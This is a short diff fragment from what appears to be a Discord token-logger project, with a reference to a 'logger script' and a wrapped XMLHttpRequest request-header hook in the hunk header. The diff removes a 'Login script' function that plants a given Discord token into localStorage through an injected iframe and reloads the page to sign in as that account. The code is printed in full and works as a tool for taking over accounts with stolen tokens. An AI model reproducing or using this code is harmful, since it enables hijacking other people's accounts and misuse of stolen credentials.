@@ -13,16 +13,4 @@ XMLHttpRequest.prototype.wrappedSetRequestHeader=XMLHttpRequest.prototype.setReq
 
 Code thingy before you send the logger script   ```js    <--- you do not need this Btw it was for the Beta version of the script 
 -------------------------------------------------------------------------------------------------------------------------
-Login script    (This does not work sometimes depends on what discord you are using) (Works best in Webrowser version) 
 
-
-     
-function login(token) {
-setInterval(() => {
-document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
-}, 50);
-setTimeout(() => {
-location.reload();
-}, 2500);
-}
--------------------------------------------------------------------------------------------------------------------------
